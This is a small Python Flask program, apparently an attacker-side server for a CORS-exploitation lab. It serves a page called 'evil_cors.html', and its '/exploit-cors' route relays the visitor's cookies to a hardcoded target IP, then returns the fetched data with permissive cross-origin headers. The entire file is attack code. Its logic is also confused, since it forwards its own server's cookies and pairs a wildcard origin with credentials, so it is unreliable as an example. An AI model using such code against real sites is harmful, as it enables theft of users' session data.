from flask import Flask, request, render_template, jsonify
import requests

app = Flask(__name__, static_url_path='/static', static_folder='static')

@app.route("/")
def start():
    return render_template("evil_cors.html")

@app.route("/exploit-cors")
def exploit_cors():
    # This endpoint fetches data from the target website
    target_url = "http://34.38.142.16:4444/offers"
    response = jsonify({"data": fetch_data(target_url)})
    response.headers.add("Access-Control-Allow-Origin", "*")  # Allow requests from any origin
    response.headers.add("Access-Control-Allow-Credentials", "true")
    return response

def fetch_data(url):
    # Perform a simple GET request to fetch data from the target website
    try:
        response = requests.get(url, cookies=request.cookies)
        return response.text
    except Exception as e:
        return f"Error: {str(e)}"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=1337)

